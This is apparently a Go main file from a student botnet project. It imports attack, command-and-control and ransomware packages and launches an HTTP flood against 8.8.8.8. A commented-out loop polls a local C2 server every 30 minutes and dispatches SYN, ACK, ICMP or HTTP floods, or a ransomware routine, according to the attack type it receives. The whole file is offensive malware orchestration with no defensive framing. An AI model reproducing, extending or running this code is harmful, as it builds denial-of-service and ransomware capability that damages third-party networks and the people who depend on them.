package main

import (
	"github.com/goddamnnoob/miniproject-bot/attack"
	"github.com/goddamnnoob/miniproject-bot/commandandcontrol"
	"github.com/goddamnnoob/miniproject-bot/ransomeware"
)

const GetAllAttacksUrl string = "http://127.0.0.1:8000/GetAllAttacks"

func main() {
	attack := attack.DDOS{
		Host:             "8.8.8.8",
		Port:             80,
		Packetbatchcount: 1,
		AttackType:       "1",
	}
	attack.HttpFlood()
	/*
		go func() {
			for {
				CheckAndExecuteAttacks()
				time.Sleep(30 * time.Minute)
			}
		}()
	*/
}

func CheckAndExecuteAttacks() {
	attacks := commandandcontrol.GetNewAttacks(GetAllAttacksUrl)
	for _, attack := range *attacks {
		if attack.AttackType == "1" || attack.AttackType == "2" {
			//SYN Flood and ACK Flood
			attack.TCPAttack()
		} else if attack.AttackType == "3" {
			//icmp flood
			attack.ICMPAttack()
		} else if attack.AttackType == "4" {
			//http flood
			attack.HttpFlood()
		} else if attack.AttackType == "5" {
			//ransomeware
			ransomeware.Ransomeware()
		}
	}

}
